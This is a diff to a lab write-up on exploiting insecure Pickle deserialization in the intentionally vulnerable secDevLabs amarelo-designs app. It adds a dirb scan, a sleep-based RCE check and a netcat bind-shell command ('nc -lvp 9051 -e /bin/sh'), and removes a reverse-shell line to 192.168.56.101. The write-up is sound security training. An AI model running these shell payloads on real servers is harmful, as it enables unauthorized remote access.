@@ -10,7 +10,11 @@ It's possible to reach the server's web application from the HTTP port 5000, as 
 
 <img src="attack1.png" align="center"/>
 
-Making use of the [Dirb] tool to search for webpages, we were able to find `/user` and `/admin`, as shown by the picture below:
+Making use of the [Dirb] tool to search for webpages, we were able to find `/user`, `/admin` and `/console`, as shown by the picture below:
+
+```sh
+$ dirb http://localhost:5000 /usr/share/wordlists/dirb/common.txt
+```
 
 <p align="center">
     <img src="attack2.png"/>
@@ -36,7 +40,7 @@ After decoding the cookie, which is in base64, the following structure was found
 
 <img src="attack6.png" align="center"/>
 
-The structure found is very similar to the ones created with the function [Pickle]. We can be certain of that by having a look at the app's code. The hint is now confirmed, the app uses Pickle, as we can see from the image below:
+The structure found is very similar to the ones created with the function [Pickle]. We can be certain of that by having a look at the app's [code][3]. The hint is now confirmed, the app uses Pickle, as we can see from the image below:
 
 
 <img src="attack7.png" align="center"/>
@@ -77,13 +81,25 @@ r = requests.get(url, cookies=cookie)
 
 In order to be certain that the app is exploitable, we will send a sleep command to make the app unresposive for 10 seconds. If the app takes 10 seconds to return our request, than it's confirmed, the app is exploitable. As we can see from the image below, the app takes some time to return our request, thus confirming that it is exploitable and confirming the remote code execution: 
 
+```sh
+$ python serializaPickle.py "sleep 10" http://localhost:5000/user
+```
+
 <img src="attack9.png" align="center"/>
 
-In order to show how an attacker could have access to the server through an RCE, we will use the code depicted on the image below and an attacker listening on the 9051 port will receive a reverse shell.
+In order to show how an attacker could have access to the server through an RCE, we will use the code depicted on the image below to create a bind shell on the server on the 9051 port.
+
+```sh
+$ python serializaPickle.py "nc -lvp 9051 -e /bin/sh" http://localhost:5000/user
+```
 
 <img src="attack10.png" align="center"/>
 
-The code used above creates a named pipe `f` and redirects to it the output of `/bin/sh -i 2>&1|nc 192.168.56.101 9051` and then forwards it to the attacker. As we can see from the image below, the attacker listening on the 9051 port then receives the reverse shell from the server hosting the app.
+The code used above creates bind shell on the server's port 9051, which is then listening for incoming connections. After that, the attacker can connect to that port using a simple [netcat] command, as show below:
+
+```sh
+$ nc localhost 9051
+```
 
 <p align="center">
     <img src="attack11.png"/>
@@ -94,4 +110,6 @@ The code used above creates a named pipe `f` and redirects to it the output of `
 [2]: https://github.com/globocom/secDevLabs/tree/master/owasp-top10-2017-apps/a8/amarelo-designs
 [Dirb]: https://tools.kali.org/web-applications/dirb
 [Burp Suite]: https://en.wikipedia.org/wiki/Burp_suite
+[3]: https://github.com/globocom/secDevLabs/blob/master/owasp-top10-2017-apps/a8/amarelo-designs/app/app.py
 [Pickle]: https://docs.python.org/2/library/pickle.html
+[netcat]: https://en.wikipedia.org/wiki/Netcat
